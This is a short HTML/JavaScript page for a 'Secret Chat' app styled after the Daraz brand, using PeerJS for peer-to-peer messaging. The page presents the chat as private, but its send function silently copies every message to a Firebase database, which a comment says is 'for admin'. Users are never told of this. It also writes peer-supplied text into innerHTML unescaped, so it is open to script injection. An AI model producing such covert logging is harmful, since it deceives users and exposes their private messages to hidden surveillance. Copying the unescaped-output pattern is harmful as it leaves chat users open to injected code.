<!DOCTYPE html>
<html>
<head>
    <title>Secret Chat - Daraz Style</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
    
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 30px; background: #f4f4f4; }
        #chat-box { width: 320px; height: 400px; border: 1px solid #ddd; border-radius: 8px; overflow-y: scroll; padding: 15px; background: white; margin-top: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        input { width: 280px; padding: 10px; margin-bottom: 8px; border: 1px solid #ccc; border-radius: 5px; outline: none; }
        button { padding: 8px 20px; cursor: pointer; background: #f85606; color: white; border: none; border-radius: 5px; font-weight: bold; }
        button:hover { background: #d44a05; }
        .my-id-text { font-size: 12px; color: #555; margin-bottom: 10px; }
    </style>
</head>
<body>

    <h2 style="color: #f85606; italic">daraz Secret Chat</h2>

    <div class="my-id-text">Tomar ID: <span id="my-id" style="font-weight: bold; color: #000;">Connecting...</span></div>

    <input type="text" id="friend-id" placeholder="Bondhur ID boshao">
    <button onclick="connectToFriend()">Connect</button>

    <div id="chat-box"></div>

    <input type="text" id="message" placeholder="Type message here...">
    <button onclick="sendMessage()">Send</button>

    <script>
        // --- Firebase Configuration ---
        // Tomar Firebase theke ei config-ta replace koro
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            databaseURL: "YOUR_DATABASE_URL",
            projectId: "YOUR_PROJECT_ID"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // --- PeerJS Setup ---
        const peer = new Peer();
        let conn;

        peer.on('open', (id) => {
            document.getElementById('my-id').innerText = id;
        });

        peer.on('connection', (connection) => {
            conn = connection;
            setupChat();
        });

        function connectToFriend() {
            const friendID = document.getElementById('friend-id').value;
            if (friendID) {
                conn = peer.connect(friendID);
                setupChat();
            }
        }

        function setupChat() {
            conn.on('data', (data) => {
                displayMessage("Bondhu", data, "text-align: left; color: #333;");
            });
            alert("Connected with friend!");
        }

        function sendMessage() {
            const msgInput = document.getElementById('message');
            const msg = msgInput.value;
            
            if (conn && msg) {
                // 1. Bondhuke pathano (PeerJS)
                conn.send(msg);
                
                // 2. Database-e save kora (Admin-er jonno)
                db.ref("all_messages").push({
                    sender: "User",
                    text: msg,
                    timestamp: Date.now()
                });

                displayMessage("Ami", msg, "text-align: right; color: #f85606; font-weight: bold;");
                msgInput.value = "";
            }
        }

        function displayMessage(user, text, style) {
            const box = document.getElementById('chat-box');
            box.innerHTML += `<p style="${style}"><b>${user}:</b> ${text}</p>`;
            box.scrollTop = box.scrollHeight;
        }
    </script>
</body>
</html>
